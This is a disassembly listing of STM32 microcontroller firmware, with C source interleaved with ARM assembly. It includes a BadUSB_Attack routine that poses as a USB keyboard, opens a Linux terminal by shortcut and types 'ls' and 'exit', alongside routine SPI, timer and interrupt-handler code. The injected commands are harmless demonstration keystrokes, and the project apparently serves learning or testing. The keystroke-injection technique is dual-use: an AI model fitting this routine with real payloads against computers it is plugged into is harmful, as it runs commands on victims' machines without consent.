08000a68 <BadUSB_Attack>:

void BadUSB_Attack(int type){//type = 0:Linux; type = 1:windows.
 8000a68:	b580      	push	{r7, lr}
 8000a6a:	b0c4      	sub	sp, #272	; 0x110
 8000a6c:	af00      	add	r7, sp, #0
 8000a6e:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000a72:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000a76:	6018      	str	r0, [r3, #0]
	if(type == 0){
 8000a78:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000a7c:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000a80:	681b      	ldr	r3, [r3, #0]
 8000a82:	2b00      	cmp	r3, #0
 8000a84:	d129      	bne.n	8000ada <BadUSB_Attack+0x72>
		uint8_t StartLinuxTerminal[3] = {130, 131, 'T'};
 8000a86:	4a26      	ldr	r2, [pc, #152]	; (8000b20 <BadUSB_Attack+0xb8>)
 8000a88:	f507 7386 	add.w	r3, r7, #268	; 0x10c
 8000a8c:	6812      	ldr	r2, [r2, #0]
 8000a8e:	4611      	mov	r1, r2
 8000a90:	8019      	strh	r1, [r3, #0]
 8000a92:	3302      	adds	r3, #2
 8000a94:	0c12      	lsrs	r2, r2, #16
 8000a96:	701a      	strb	r2, [r3, #0]
		char AttackStr[256];

		SimulateShortcutKey(StartLinuxTerminal, 3);
 8000a98:	f507 7386 	add.w	r3, r7, #268	; 0x10c
 8000a9c:	2103      	movs	r1, #3
 8000a9e:	4618      	mov	r0, r3
 8000aa0:	f7ff ff3e 	bl	8000920 <SimulateShortcutKey>
		HAL_Delay(1000);   //wait to observe
 8000aa4:	f44f 707a 	mov.w	r0, #1000	; 0x3e8
 8000aa8:	f000 fb32 	bl	8001110 <HAL_Delay>
		strcpy(AttackStr, "ls\n\nexit\n\n");
 8000aac:	f107 030c 	add.w	r3, r7, #12
 8000ab0:	4a1c      	ldr	r2, [pc, #112]	; (8000b24 <BadUSB_Attack+0xbc>)
 8000ab2:	ca07      	ldmia	r2, {r0, r1, r2}
 8000ab4:	c303      	stmia	r3!, {r0, r1}
 8000ab6:	801a      	strh	r2, [r3, #0]
 8000ab8:	3302      	adds	r3, #2
 8000aba:	0c12      	lsrs	r2, r2, #16
 8000abc:	701a      	strb	r2, [r3, #0]
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000abe:	f107 030c 	add.w	r3, r7, #12
 8000ac2:	4618      	mov	r0, r3
 8000ac4:	f7ff fb82 	bl	80001cc <strlen>
 8000ac8:	4603      	mov	r3, r0
 8000aca:	4619      	mov	r1, r3
 8000acc:	f107 030c 	add.w	r3, r7, #12
 8000ad0:	4a15      	ldr	r2, [pc, #84]	; (8000b28 <BadUSB_Attack+0xc0>)
 8000ad2:	4618      	mov	r0, r3
 8000ad4:	f7ff ff42 	bl	800095c <SimulateKeyStrokes>
	}else{    //test
		char AttackStr[256];
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
	}
}
 8000ad8:	e01c      	b.n	8000b14 <BadUSB_Attack+0xac>
	}else if(type == 1){
 8000ada:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000ade:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000ae2:	681b      	ldr	r3, [r3, #0]
 8000ae4:	2b01      	cmp	r3, #1
 8000ae6:	d015      	beq.n	8000b14 <BadUSB_Attack+0xac>
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
 8000ae8:	f107 030c 	add.w	r3, r7, #12
 8000aec:	4a0f      	ldr	r2, [pc, #60]	; (8000b2c <BadUSB_Attack+0xc4>)
 8000aee:	4618      	mov	r0, r3
 8000af0:	4611      	mov	r1, r2
 8000af2:	234e      	movs	r3, #78	; 0x4e
 8000af4:	461a      	mov	r2, r3
 8000af6:	f00c fa41 	bl	800cf7c <memcpy>
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000afa:	f107 030c 	add.w	r3, r7, #12
 8000afe:	4618      	mov	r0, r3
 8000b00:	f7ff fb64 	bl	80001cc <strlen>
 8000b04:	4603      	mov	r3, r0
 8000b06:	4619      	mov	r1, r3
 8000b08:	f107 030c 	add.w	r3, r7, #12
 8000b0c:	4a06      	ldr	r2, [pc, #24]	; (8000b28 <BadUSB_Attack+0xc0>)
 8000b0e:	4618      	mov	r0, r3
 8000b10:	f7ff ff24 	bl	800095c <SimulateKeyStrokes>
}
 8000b14:	bf00      	nop
 8000b16:	f507 7788 	add.w	r7, r7, #272	; 0x110
 8000b1a:	46bd      	mov	sp, r7
 8000b1c:	bd80      	pop	{r7, pc}
 8000b1e:	bf00      	nop
 8000b20:	0800d090 	.word	0x0800d090
 8000b24:	0800d034 	.word	0x0800d034
 8000b28:	20000278 	.word	0x20000278
 8000b2c:	0800d040 	.word	0x0800d040

08000b30 <HAL_TIM_PeriodElapsedCallback>:

void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim){
 8000b30:	b580      	push	{r7, lr}
 8000b32:	b082      	sub	sp, #8
 8000b34:	af00      	add	r7, sp, #0
 8000b36:	6078      	str	r0, [r7, #4]
	if(htim == &htim2){
 8000b38:	687b      	ldr	r3, [r7, #4]
 8000b3a:	4a1d      	ldr	r2, [pc, #116]	; (8000bb0 <HAL_TIM_PeriodElapsedCallback+0x80>)
 8000b3c:	4293      	cmp	r3, r2
 8000b3e:	d133      	bne.n	8000ba8 <HAL_TIM_PeriodElapsedCallback+0x78>
		if(InterruptCnt == 0){
 8000b40:	4b1c      	ldr	r3, [pc, #112]	; (8000bb4 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000b42:	681b      	ldr	r3, [r3, #0]
 8000b44:	2b00      	cmp	r3, #0
 8000b46:	d108      	bne.n	8000b5a <HAL_TIM_PeriodElapsedCallback+0x2a>
			//Simulate press operation
			Get_Single_Descriptor(128);
 8000b48:	2080      	movs	r0, #128	; 0x80
 8000b4a:	f7ff fdfd 	bl	8000748 <Get_Single_Descriptor>
			USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000b4e:	220f      	movs	r2, #15
 8000b50:	4919      	ldr	r1, [pc, #100]	; (8000bb8 <HAL_TIM_PeriodElapsedCallback+0x88>)
 8000b52:	481a      	ldr	r0, [pc, #104]	; (8000bbc <HAL_TIM_PeriodElapsedCallback+0x8c>)
 8000b54:	f007 feec 	bl	8008930 <USBD_CUSTOM_HID_SendReport>
 8000b58:	e018      	b.n	8000b8c <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_SET);
		}else if(InterruptCnt == 1){
 8000b5a:	4b16      	ldr	r3, [pc, #88]	; (8000bb4 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000b5c:	681b      	ldr	r3, [r3, #0]
 8000b5e:	2b01      	cmp	r3, #1
 8000b60:	d10c      	bne.n	8000b7c <HAL_TIM_PeriodElapsedCallback+0x4c>
			//Simulate release operation
			SimulateKeyRelease();
 8000b62:	f7ff feb5 	bl	80008d0 <SimulateKeyRelease>
			//Judging whether to Interrupt
			if((recv_buffer[0]&0x02) != 0x02)
 8000b66:	4b16      	ldr	r3, [pc, #88]	; (8000bc0 <HAL_TIM_PeriodElapsedCallback+0x90>)
 8000b68:	781b      	ldrb	r3, [r3, #0]
 8000b6a:	f003 0302 	and.w	r3, r3, #2
 8000b6e:	2b00      	cmp	r3, #0
 8000b70:	d10c      	bne.n	8000b8c <HAL_TIM_PeriodElapsedCallback+0x5c>
				InterruptCnt = -1;
 8000b72:	4b10      	ldr	r3, [pc, #64]	; (8000bb4 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000b74:	f04f 32ff 	mov.w	r2, #4294967295
 8000b78:	601a      	str	r2, [r3, #0]
 8000b7a:	e007      	b.n	8000b8c <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_RESET);
		}else{
			//off timer
			TIM2->CR1 &= ~TIM_CR1_CEN;
 8000b7c:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000b80:	681b      	ldr	r3, [r3, #0]
 8000b82:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000b86:	f023 0301 	bic.w	r3, r3, #1
 8000b8a:	6013      	str	r3, [r2, #0]
		}
		InterruptCnt = (InterruptCnt+1)%3;
 8000b8c:	4b09      	ldr	r3, [pc, #36]	; (8000bb4 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000b8e:	681b      	ldr	r3, [r3, #0]
 8000b90:	1c59      	adds	r1, r3, #1
 8000b92:	4b0c      	ldr	r3, [pc, #48]	; (8000bc4 <HAL_TIM_PeriodElapsedCallback+0x94>)
 8000b94:	fb83 3201 	smull	r3, r2, r3, r1
 8000b98:	17cb      	asrs	r3, r1, #31
 8000b9a:	1ad2      	subs	r2, r2, r3
 8000b9c:	4613      	mov	r3, r2
 8000b9e:	005b      	lsls	r3, r3, #1
 8000ba0:	4413      	add	r3, r2
 8000ba2:	1aca      	subs	r2, r1, r3
 8000ba4:	4b03      	ldr	r3, [pc, #12]	; (8000bb4 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000ba6:	601a      	str	r2, [r3, #0]
	}
}
 8000ba8:	bf00      	nop
 8000baa:	3708      	adds	r7, #8
 8000bac:	46bd      	mov	sp, r7
 8000bae:	bd80      	pop	{r7, pc}
 8000bb0:	200002e4 	.word	0x200002e4
 8000bb4:	20000274 	.word	0x20000274
 8000bb8:	2000025c 	.word	0x2000025c
 8000bbc:	200003c0 	.word	0x200003c0
 8000bc0:	2000026c 	.word	0x2000026c
 8000bc4:	55555556 	.word	0x55555556

08000bc8 <Error_Handler>:
/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
 8000bc8:	b480      	push	{r7}
 8000bca:	af00      	add	r7, sp, #0
  \details Disables IRQ interrupts by setting the I-bit in the CPSR.
           Can only be executed in Privileged modes.
 */
__STATIC_FORCEINLINE void __disable_irq(void)
{
  __ASM volatile ("cpsid i" : : : "memory");
 8000bcc:	b672      	cpsid	i
}
 8000bce:	bf00      	nop
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */
  __disable_irq();
  while (1)
 8000bd0:	e7fe      	b.n	8000bd0 <Error_Handler+0x8>
	...

08000bd4 <MX_SPI1_Init>:

SPI_HandleTypeDef hspi1;

/* SPI1 init function */
void MX_SPI1_Init(void)
{
 8000bd4:	b580      	push	{r7, lr}
 8000bd6:	af00      	add	r7, sp, #0
  /* USER CODE END SPI1_Init 0 */

  /* USER CODE BEGIN SPI1_Init 1 */

  /* USER CODE END SPI1_Init 1 */
  hspi1.Instance = SPI1;
 8000bd8:	4b1b      	ldr	r3, [pc, #108]	; (8000c48 <MX_SPI1_Init+0x74>)
 8000bda:	4a1c      	ldr	r2, [pc, #112]	; (8000c4c <MX_SPI1_Init+0x78>)
 8000bdc:	601a      	str	r2, [r3, #0]
  hspi1.Init.Mode = SPI_MODE_MASTER;
 8000bde:	4b1a      	ldr	r3, [pc, #104]	; (8000c48 <MX_SPI1_Init+0x74>)
 8000be0:	f44f 7282 	mov.w	r2, #260	; 0x104
 8000be4:	605a      	str	r2, [r3, #4]
  hspi1.Init.Direction = SPI_DIRECTION_2LINES;
 8000be6:	4b18      	ldr	r3, [pc, #96]	; (8000c48 <MX_SPI1_Init+0x74>)
 8000be8:	2200      	movs	r2, #0
 8000bea:	609a      	str	r2, [r3, #8]
  hspi1.Init.DataSize = SPI_DATASIZE_8BIT;
 8000bec:	4b16      	ldr	r3, [pc, #88]	; (8000c48 <MX_SPI1_Init+0x74>)
 8000bee:	f44f 62e0 	mov.w	r2, #1792	; 0x700
 8000bf2:	60da      	str	r2, [r3, #12]
  hspi1.Init.CLKPolarity = SPI_POLARITY_LOW;
 8000bf4:	4b14      	ldr	r3, [pc, #80]	; (8000c48 <MX_SPI1_Init+0x74>)
 8000bf6:	2200      	movs	r2, #0
 8000bf8:	611a      	str	r2, [r3, #16]
  hspi1.Init.CLKPhase = SPI_PHASE_1EDGE;
 8000bfa:	4b13      	ldr	r3, [pc, #76]	; (8000c48 <MX_SPI1_Init+0x74>)
 8000bfc:	2200      	movs	r2, #0
 8000bfe:	615a      	str	r2, [r3, #20]
  hspi1.Init.NSS = SPI_NSS_SOFT;
 8000c00:	4b11      	ldr	r3, [pc, #68]	; (8000c48 <MX_SPI1_Init+0x74>)
 8000c02:	f44f 7200 	mov.w	r2, #512	; 0x200
 8000c06:	619a      	str	r2, [r3, #24]
  hspi1.Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_64;
 8000c08:	4b0f      	ldr	r3, [pc, #60]	; (8000c48 <MX_SPI1_Init+0x74>)
 8000c0a:	2228      	movs	r2, #40	; 0x28
 8000c0c:	61da      	str	r2, [r3, #28]
  hspi1.Init.FirstBit = SPI_FIRSTBIT_MSB;
 8000c0e:	4b0e      	ldr	r3, [pc, #56]	; (8000c48 <MX_SPI1_Init+0x74>)
 8000c10:	2200      	movs	r2, #0
 8000c12:	621a      	str	r2, [r3, #32]
  hspi1.Init.TIMode = SPI_TIMODE_DISABLE;
 8000c14:	4b0c      	ldr	r3, [pc, #48]	; (8000c48 <MX_SPI1_Init+0x74>)
 8000c16:	2200      	movs	r2, #0
 8000c18:	625a      	str	r2, [r3, #36]	; 0x24
  hspi1.Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8000c1a:	4b0b      	ldr	r3, [pc, #44]	; (8000c48 <MX_SPI1_Init+0x74>)
 8000c1c:	2200      	movs	r2, #0
 8000c1e:	629a      	str	r2, [r3, #40]	; 0x28
  hspi1.Init.CRCPolynomial = 7;
 8000c20:	4b09      	ldr	r3, [pc, #36]	; (8000c48 <MX_SPI1_Init+0x74>)
 8000c22:	2207      	movs	r2, #7
 8000c24:	62da      	str	r2, [r3, #44]	; 0x2c
  hspi1.Init.CRCLength = SPI_CRC_LENGTH_DATASIZE;
 8000c26:	4b08      	ldr	r3, [pc, #32]	; (8000c48 <MX_SPI1_Init+0x74>)
 8000c28:	2200      	movs	r2, #0
 8000c2a:	631a      	str	r2, [r3, #48]	; 0x30
  hspi1.Init.NSSPMode = SPI_NSS_PULSE_ENABLE;
 8000c2c:	4b06      	ldr	r3, [pc, #24]	; (8000c48 <MX_SPI1_Init+0x74>)
 8000c2e:	2208      	movs	r2, #8
 8000c30:	635a      	str	r2, [r3, #52]	; 0x34
  if (HAL_SPI_Init(&hspi1) != HAL_OK)
 8000c32:	4805      	ldr	r0, [pc, #20]	; (8000c48 <MX_SPI1_Init+0x74>)
 8000c34:	f003 ff14 	bl	8004a60 <HAL_SPI_Init>
 8000c38:	4603      	mov	r3, r0
 8000c3a:	2b00      	cmp	r3, #0
 8000c3c:	d001      	beq.n	8000c42 <MX_SPI1_Init+0x6e>
  {
    Error_Handler();
 8000c3e:	f7ff ffc3 	bl	8000bc8 <Error_Handler>
  }
  /* USER CODE BEGIN SPI1_Init 2 */

  /* USER CODE END SPI1_Init 2 */

}
 8000c42:	bf00      	nop
 8000c44:	bd80      	pop	{r7, pc}
 8000c46:	bf00      	nop
 8000c48:	20000280 	.word	0x20000280
 8000c4c:	40013000 	.word	0x40013000

08000c50 <HAL_SPI_MspInit>:

void HAL_SPI_MspInit(SPI_HandleTypeDef* spiHandle)
{
 8000c50:	b580      	push	{r7, lr}
 8000c52:	b08a      	sub	sp, #40	; 0x28
 8000c54:	af00      	add	r7, sp, #0
 8000c56:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8000c58:	f107 0314 	add.w	r3, r7, #20
 8000c5c:	2200      	movs	r2, #0
 8000c5e:	601a      	str	r2, [r3, #0]
 8000c60:	605a      	str	r2, [r3, #4]
 8000c62:	609a      	str	r2, [r3, #8]
 8000c64:	60da      	str	r2, [r3, #12]
 8000c66:	611a      	str	r2, [r3, #16]
  if(spiHandle->Instance==SPI1)
 8000c68:	687b      	ldr	r3, [r7, #4]
 8000c6a:	681b      	ldr	r3, [r3, #0]
 8000c6c:	4a17      	ldr	r2, [pc, #92]	; (8000ccc <HAL_SPI_MspInit+0x7c>)
 8000c6e:	4293      	cmp	r3, r2
 8000c70:	d128      	bne.n	8000cc4 <HAL_SPI_MspInit+0x74>
  {
  /* USER CODE BEGIN SPI1_MspInit 0 */

  /* USER CODE END SPI1_MspInit 0 */
    /* SPI1 clock enable */
    __HAL_RCC_SPI1_CLK_ENABLE();
 8000c72:	4b17      	ldr	r3, [pc, #92]	; (8000cd0 <HAL_SPI_MspInit+0x80>)
 8000c74:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000c76:	4a16      	ldr	r2, [pc, #88]	; (8000cd0 <HAL_SPI_MspInit+0x80>)
 8000c78:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 8000c7c:	6613      	str	r3, [r2, #96]	; 0x60
 8000c7e:	4b14      	ldr	r3, [pc, #80]	; (8000cd0 <HAL_SPI_MspInit+0x80>)
 8000c80:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000c82:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 8000c86:	613b      	str	r3, [r7, #16]
 8000c88:	693b      	ldr	r3, [r7, #16]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 8000c8a:	4b11      	ldr	r3, [pc, #68]	; (8000cd0 <HAL_SPI_MspInit+0x80>)
 8000c8c:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000c8e:	4a10      	ldr	r2, [pc, #64]	; (8000cd0 <HAL_SPI_MspInit+0x80>)
 8000c90:	f043 0301 	orr.w	r3, r3, #1
 8000c94:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000c96:	4b0e      	ldr	r3, [pc, #56]	; (8000cd0 <HAL_SPI_MspInit+0x80>)
 8000c98:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000c9a:	f003 0301 	and.w	r3, r3, #1
 8000c9e:	60fb      	str	r3, [r7, #12]
 8000ca0:	68fb      	ldr	r3, [r7, #12]
    /**SPI1 GPIO Configuration
    PA1     ------> SPI1_SCK
    PA6     ------> SPI1_MISO
    PA7     ------> SPI1_MOSI
    */
    GPIO_InitStruct.Pin = GPIO_PIN_1|GPIO_PIN_6|GPIO_PIN_7;
 8000ca2:	23c2      	movs	r3, #194	; 0xc2
 8000ca4:	617b      	str	r3, [r7, #20]
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8000ca6:	2302      	movs	r3, #2
 8000ca8:	61bb      	str	r3, [r7, #24]
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000caa:	2300      	movs	r3, #0
 8000cac:	61fb      	str	r3, [r7, #28]
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8000cae:	2303      	movs	r3, #3
 8000cb0:	623b      	str	r3, [r7, #32]
    GPIO_InitStruct.Alternate = GPIO_AF5_SPI1;
 8000cb2:	2305      	movs	r3, #5
 8000cb4:	627b      	str	r3, [r7, #36]	; 0x24
    HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);
 8000cb6:	f107 0314 	add.w	r3, r7, #20
 8000cba:	4619      	mov	r1, r3
 8000cbc:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000cc0:	f000 fdd4 	bl	800186c <HAL_GPIO_Init>

  /* USER CODE BEGIN SPI1_MspInit 1 */

  /* USER CODE END SPI1_MspInit 1 */
  }
}
 8000cc4:	bf00      	nop
 8000cc6:	3728      	adds	r7, #40	; 0x28
 8000cc8:	46bd      	mov	sp, r7
 8000cca:	bd80      	pop	{r7, pc}
 8000ccc:	40013000 	.word	0x40013000
 8000cd0:	40021000 	.word	0x40021000

08000cd4 <HAL_MspInit>:
/* USER CODE END 0 */
/**
  * Initializes the Global MSP.
  */
void HAL_MspInit(void)
{
 8000cd4:	b480      	push	{r7}
 8000cd6:	b083      	sub	sp, #12
 8000cd8:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MspInit 0 */

  /* USER CODE END MspInit 0 */

  __HAL_RCC_SYSCFG_CLK_ENABLE();
 8000cda:	4b0f      	ldr	r3, [pc, #60]	; (8000d18 <HAL_MspInit+0x44>)
 8000cdc:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000cde:	4a0e      	ldr	r2, [pc, #56]	; (8000d18 <HAL_MspInit+0x44>)
 8000ce0:	f043 0301 	orr.w	r3, r3, #1
 8000ce4:	6613      	str	r3, [r2, #96]	; 0x60
 8000ce6:	4b0c      	ldr	r3, [pc, #48]	; (8000d18 <HAL_MspInit+0x44>)
 8000ce8:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000cea:	f003 0301 	and.w	r3, r3, #1
 8000cee:	607b      	str	r3, [r7, #4]
 8000cf0:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_PWR_CLK_ENABLE();
 8000cf2:	4b09      	ldr	r3, [pc, #36]	; (8000d18 <HAL_MspInit+0x44>)
 8000cf4:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000cf6:	4a08      	ldr	r2, [pc, #32]	; (8000d18 <HAL_MspInit+0x44>)
 8000cf8:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8000cfc:	6593      	str	r3, [r2, #88]	; 0x58
 8000cfe:	4b06      	ldr	r3, [pc, #24]	; (8000d18 <HAL_MspInit+0x44>)
 8000d00:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000d02:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8000d06:	603b      	str	r3, [r7, #0]
 8000d08:	683b      	ldr	r3, [r7, #0]
  /* System interrupt init*/

  /* USER CODE BEGIN MspInit 1 */

  /* USER CODE END MspInit 1 */
}
 8000d0a:	bf00      	nop
 8000d0c:	370c      	adds	r7, #12
 8000d0e:	46bd      	mov	sp, r7
 8000d10:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000d14:	4770      	bx	lr
 8000d16:	bf00      	nop
 8000d18:	40021000 	.word	0x40021000

08000d1c <NMI_Handler>:
/******************************************************************************/
/**
  * @brief This function handles Non maskable interrupt.
  */
void NMI_Handler(void)
{
 8000d1c:	b480      	push	{r7}
 8000d1e:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN NonMaskableInt_IRQn 0 */

  /* USER CODE END NonMaskableInt_IRQn 0 */
  /* USER CODE BEGIN NonMaskableInt_IRQn 1 */
   while (1)
 8000d20:	e7fe      	b.n	8000d20 <NMI_Handler+0x4>

08000d22 <HardFault_Handler>:

/**
  * @brief This function handles Hard fault interrupt.
  */
void HardFault_Handler(void)
{
 8000d22:	b480      	push	{r7}
 8000d24:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN HardFault_IRQn 0 */

  /* USER CODE END HardFault_IRQn 0 */
  while (1)
 8000d26:	e7fe      	b.n	8000d26 <HardFault_Handler+0x4>

08000d28 <MemManage_Handler>:

/**
  * @brief This function handles Memory management fault.
  */
void MemManage_Handler(void)
{
 8000d28:	b480      	push	{r7}
 8000d2a:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MemoryManagement_IRQn 0 */

  /* USER CODE END MemoryManagement_IRQn 0 */
  while (1)
 8000d2c:	e7fe      	b.n	8000d2c <MemManage_Handler+0x4>

08000d2e <BusFault_Handler>:

/**
  * @brief This function handles Prefetch fault, memory access fault.
  */
void BusFault_Handler(void)
{
 8000d2e:	b480      	push	{r7}
 8000d30:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN BusFault_IRQn 0 */

  /* USER CODE END BusFault_IRQn 0 */
  while (1)
 8000d32:	e7fe      	b.n	8000d32 <BusFault_Handler+0x4>

08000d34 <UsageFault_Handler>:

/**
  * @brief This function handles Undefined instruction or illegal state.
  */
void UsageFault_Handler(void)
{
 8000d34:	b480      	push	{r7}
 8000d36:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN UsageFault_IRQn 0 */

  /* USER CODE END UsageFault_IRQn 0 */
  while (1)
 8000d38:	e7fe      	b.n	8000d38 <UsageFault_Handler+0x4>

08000d3a <SVC_Handler>:

/**
  * @brief This function handles System service call via SWI instruction.
  */
void SVC_Handler(void)
{
 8000d3a:	b480      	push	{r7}
 8000d3c:	af00      	add	r7, sp, #0

  /* USER CODE END SVCall_IRQn 0 */
  /* USER CODE BEGIN SVCall_IRQn 1 */

  /* USER CODE END SVCall_IRQn 1 */
}
 8000d3e:	bf00      	nop
 8000d40:	46bd      	mov	sp, r7
 8000d42:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000d46:	4770      	bx	lr

08000d48 <DebugMon_Handler>:

/**
  * @brief This function handles Debug monitor.
  */
void DebugMon_Handler(void)
{
 8000d48:	b480      	push	{r7}
 8000d4a:	af00      	add	r7, sp, #0

  /* USER CODE END DebugMonitor_IRQn 0 */
  /* USER CODE BEGIN DebugMonitor_IRQn 1 */

  /* USER CODE END DebugMonitor_IRQn 1 */
}
 8000d4c:	bf00      	nop
 8000d4e:	46bd      	mov	sp, r7
 8000d50:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000d54:	4770      	bx	lr

08000d56 <PendSV_Handler>:

/**
  * @brief This function handles Pendable request for system service.
  */
void PendSV_Handler(void)
{
 8000d56:	b480      	push	{r7}
 8000d58:	af00      	add	r7, sp, #0

  /* USER CODE END PendSV_IRQn 0 */
  /* USER CODE BEGIN PendSV_IRQn 1 */

  /* USER CODE END PendSV_IRQn 1 */
}
 8000d5a:	bf00      	nop
 8000d5c:	46bd      	mov	sp, r7
 8000d5e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000d62:	4770      	bx	lr

08000d64 <SysTick_Handler>:

/**
  * @brief This function handles System tick timer.
  */
void SysTick_Handler(void)
{
 8000d64:	b580      	push	{r7, lr}
 8000d66:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN SysTick_IRQn 0 */

  /* USER CODE END SysTick_IRQn 0 */
  HAL_IncTick();
 8000d68:	f000 f9b2 	bl	80010d0 <HAL_IncTick>
  /* USER CODE BEGIN SysTick_IRQn 1 */

  /* USER CODE END SysTick_IRQn 1 */
}
 8000d6c:	bf00      	nop
 8000d6e:	bd80      	pop	{r7, pc}

08000d70 <TIM2_IRQHandler>:

/**
  * @brief This function handles TIM2 global interrupt.
  */
void TIM2_IRQHandler(void)
{
 8000d70:	b580      	push	{r7, lr}
 8000d72:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN TIM2_IRQn 0 */

  /* USER CODE END TIM2_IRQn 0 */
  HAL_TIM_IRQHandler(&htim2);
 8000d74:	4802      	ldr	r0, [pc, #8]	; (8000d80 <TIM2_IRQHandler+0x10>)
 8000d76:	f003 ffc1 	bl	8004cfc <HAL_TIM_IRQHandler>
  /* USER CODE BEGIN TIM2_IRQn 1 */

  /* USER CODE END TIM2_IRQn 1 */
}
 8000d7a:	bf00      	nop
 8000d7c:	bd80      	pop	{r7, pc}
 8000d7e:	bf00      	nop
 8000d80:	200002e4 	.word	0x200002e4

08000d84 <USB_IRQHandler>:

/**
  * @brief This function handles USB event interrupt through EXTI line 17.
  */
void USB_IRQHandler(void)
{
 8000d84:	b580      	push	{r7, lr}
 8000d86:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_IRQn 0 */

  /* USER CODE END USB_IRQn 0 */
  HAL_PCD_IRQHandler(&hpcd_USB_FS);
 8000d88:	4802      	ldr	r0, [pc, #8]	; (8000d94 <USB_IRQHandler+0x10>)
 8000d8a:	f001 f819 	bl	8001dc0 <HAL_PCD_IRQHandler>
  /* USER CODE BEGIN USB_IRQn 1 */

  /* USER CODE END USB_IRQn 1 */
}
 8000d8e:	bf00      	nop
 8000d90:	bd80      	pop	{r7, pc}
 8000d92:	bf00      	nop
 8000d94:	20000b7c 	.word	0x20000b7c

08000d98 <SystemInit>:
  * @brief  Setup the microcontroller system.
  * @retval None
  */

void SystemInit(void)
{
 8000d98:	b480      	push	{r7}
 8000d9a:	af00      	add	r7, sp, #0
  SCB->VTOR = VECT_TAB_BASE_ADDRESS | VECT_TAB_OFFSET;
#endif

  /* FPU settings ------------------------------------------------------------*/
#if (__FPU_PRESENT == 1) && (__FPU_USED == 1)
  SCB->CPACR |= ((3UL << 20U)|(3UL << 22U));  /* set CP10 and CP11 Full Access */
 8000d9c:	4b06      	ldr	r3, [pc, #24]	; (8000db8 <SystemInit+0x20>)
 8000d9e:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8000da2:	4a05      	ldr	r2, [pc, #20]	; (8000db8 <SystemInit+0x20>)
 8000da4:	f443 0370 	orr.w	r3, r3, #15728640	; 0xf00000
 8000da8:	f8c2 3088 	str.w	r3, [r2, #136]	; 0x88
#endif
}
 8000dac:	bf00      	nop
 8000dae:	46bd      	mov	sp, r7
 8000db0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000db4:	4770      	bx	lr
 8000db6:	bf00      	nop
 8000db8:	e000ed00 	.word	0xe000ed00

08000dbc <MX_TIM2_Init>:

TIM_HandleTypeDef htim2;

/* TIM2 init function */
void MX_TIM2_Init(void)
{
 8000dbc:	b580      	push	{r7, lr}
 8000dbe:	b088      	sub	sp, #32
 8000dc0:	af00      	add	r7, sp, #0

  /* USER CODE BEGIN TIM2_Init 0 */

  /* USER CODE END TIM2_Init 0 */

